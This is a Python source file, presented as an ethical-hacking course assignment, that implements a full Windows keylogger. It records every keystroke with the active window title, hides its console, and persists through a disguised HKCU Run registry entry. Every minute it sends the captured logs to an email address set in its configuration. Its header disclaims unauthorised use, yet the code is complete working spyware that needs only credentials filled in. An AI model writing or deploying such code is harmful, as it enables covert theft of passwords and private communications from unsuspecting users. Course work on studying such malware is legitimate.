"""
Keylogger - Trabajo Parcial: Hacking Ético (1CCB0001)
======================================================
Propósito: educativo / demostrativo en entorno controlado (VM).
NO usar en sistemas sin autorización explícita del propietario.

Funcionalidades implementadas:
  1. Captura de teclas con pynput
  2. Logs con timestamp y ventana activa
  3. Persistencia vía Registro de Windows
  4. Exfiltración periódica por email (SMTP)
  5. Ocultamiento de la ventana de consola

Dependencias (instalar con pip):
  pip install pynput pywin32
"""

import os
import sys
import time
import ctypes
import winreg
import smtplib
import threading
import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import win32gui
import win32process
import psutil


# ==============================================================
# CONFIGURACIÓN  (ajustar antes de ejecutar)
# ==============================================================

# -- Email para exfiltración --
SMTP_SERVER   = "smtp.gmail.com"
SMTP_PORT     = 587
EMAIL_ORIGEN  = "tucorreo@gmail.com"      # cuenta atacante
EMAIL_PASS    = "tu_app_password"         # contraseña de aplicación Gmail
EMAIL_DESTINO = "destino@gmail.com"       # donde llegan los logs

# -- Intervalo de envío de logs (segundos) --
INTERVALO_ENVIO = 60  # cada 60 segundos

# -- Archivo de log local --
LOG_FILE = os.path.join(os.getenv("TEMP"), "sys_event_log.txt")

# -- Nombre con el que se registra en el inicio de Windows --
REG_KEY_NAME = "WindowsEventMonitor"


# ==============================================================
# 1. OCULTAMIENTO DE CONSOLA
# ==============================================================

def ocultar_consola():
    """Oculta la ventana de consola para que el proceso no sea visible."""
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0


# ==============================================================
# 2. PERSISTENCIA - Registro de Windows
# ==============================================================

def agregar_persistencia():
    """
    Agrega una entrada en HKCU\\...\\Run para que el keylogger
    se ejecute automáticamente al iniciar sesión.
    No requiere permisos de administrador (usa HKCU, no HKLM).
    """
    ruta_ejecutable = sys.executable   # ruta al .py o .exe
    ruta_script     = os.path.abspath(__file__)
    valor           = f'"{ruta_ejecutable}" "{ruta_script}"'

    try:
        clave = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(clave, REG_KEY_NAME, 0, winreg.REG_SZ, valor)
        winreg.CloseKey(clave)
    except Exception as e:
        registrar_evento(f"[ERROR persistencia] {e}")


def eliminar_persistencia():
    """Remueve la entrada del registro (para limpieza post-demo)."""
    try:
        clave = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(clave, REG_KEY_NAME)
        winreg.CloseKey(clave)
        print("[*] Persistencia eliminada.")
    except FileNotFoundError:
        print("[*] No había entrada de persistencia.")


# ==============================================================
# 3. CAPTURA DE VENTANA ACTIVA
# ==============================================================

def obtener_ventana_activa():
    """Retorna el título de la ventana en primer plano."""
    try:
        hwnd = win32gui.GetForegroundWindow()
        titulo = win32gui.GetWindowText(hwnd)
        return titulo if titulo else "Ventana desconocida"
    except Exception:
        return "Error al obtener ventana"


# ==============================================================
# 4. REGISTRO DE EVENTOS EN LOG LOCAL
# ==============================================================

_ventana_actual   = ""
_buffer_teclas    = []
_lock             = threading.Lock()


def registrar_evento(texto):
    """Escribe una línea directamente al archivo de log."""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(texto + "\n")


def flush_buffer():
    """
    Escribe el buffer de teclas al log con timestamp y ventana activa.
    Se llama cuando cambia la ventana o al enviar el email.
    """
    global _buffer_teclas
    with _lock:
        if not _buffer_teclas:
            return
        ts       = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ventana  = _ventana_actual
        teclas   = "".join(_buffer_teclas)
        linea    = f"[{ts}] [{ventana}]\n{teclas}\n{'-'*60}"
        registrar_evento(linea)
        _buffer_teclas = []


# ==============================================================
# 5. LISTENER DE TECLADO (pynput)
# ==============================================================

def on_press(key):
    """Callback ejecutado en cada pulsación de tecla."""
    global _ventana_actual

    # Detecta cambio de ventana activa
    ventana_nueva = obtener_ventana_activa()
    if ventana_nueva != _ventana_actual:
        flush_buffer()
        _ventana_actual = ventana_nueva

    # Convierte la tecla a texto legible
    try:
        caracter = key.char  # tecla normal (a, b, 1, etc.)
    except AttributeError:
        # Teclas especiales
        mapeo = {
            keyboard.Key.space:     " ",
            keyboard.Key.enter:     "\n[ENTER]\n",
            keyboard.Key.backspace: "[BACK]",
            keyboard.Key.tab:       "[TAB]",
            keyboard.Key.caps_lock: "[CAPS]",
            keyboard.Key.shift:     "[SHIFT]",
            keyboard.Key.ctrl_l:    "[CTRL]",
            keyboard.Key.ctrl_r:    "[CTRL]",
            keyboard.Key.alt_l:     "[ALT]",
            keyboard.Key.alt_r:     "[ALT]",
            keyboard.Key.delete:    "[DEL]",
            keyboard.Key.esc:       "[ESC]",
        }
        caracter = mapeo.get(key, f"[{key}]")

    with _lock:
        _buffer_teclas.append(caracter)


def iniciar_listener():
    """Inicia el listener de teclado en modo no bloqueante."""
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


# ==============================================================
# 6. EXFILTRACIÓN POR EMAIL
# ==============================================================

def leer_log():
    """Lee el contenido del log y lo vacía."""
    if not os.path.exists(LOG_FILE):
        return None
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        contenido = f.read()
    # Vaciar el archivo tras leerlo
    open(LOG_FILE, "w").close()
    return contenido if contenido.strip() else None


def enviar_email(contenido):
    """Envía el contenido del log al email de destino vía SMTP."""
    try:
        msg = MIMEMultipart()
        msg["From"]    = EMAIL_ORIGEN
        msg["To"]      = EMAIL_DESTINO
        msg["Subject"] = f"[KL] Log {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}"

        msg.attach(MIMEText(contenido, "plain", "utf-8"))

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as servidor:
            servidor.starttls()
            servidor.login(EMAIL_ORIGEN, EMAIL_PASS)
            servidor.sendmail(EMAIL_ORIGEN, EMAIL_DESTINO, msg.as_string())

    except Exception as e:
        # Si falla el envío, conserva los datos en un archivo de respaldo
        with open(LOG_FILE + ".bak", "a", encoding="utf-8") as f:
            f.write(contenido)


def ciclo_exfiltracion():
    """
    Hilo que cada INTERVALO_ENVIO segundos hace flush del buffer,
    lee el log y lo envía por email.
    """
    while True:
        time.sleep(INTERVALO_ENVIO)
        flush_buffer()
        contenido = leer_log()
        if contenido:
            enviar_email(contenido)


# ==============================================================
# PUNTO DE ENTRADA
# ==============================================================

if __name__ == "__main__":
    # Argumento de limpieza: python keylogger.py --clean
    if "--clean" in sys.argv:
        eliminar_persistencia()
        sys.exit(0)

    # 1. Ocultar consola
    ocultar_consola()

    # 2. Activar persistencia en el registro
    agregar_persistencia()

    # 3. Iniciar hilo de exfiltración por email
    hilo_email = threading.Thread(target=ciclo_exfiltracion, daemon=True)
    hilo_email.start()

    # 4. Iniciar captura de teclado (bloquea hasta que se detenga)
    registrar_evento(f"\n{'='*60}\n[INICIO] {datetime.datetime.now()}\n{'='*60}")
    iniciar_listener()
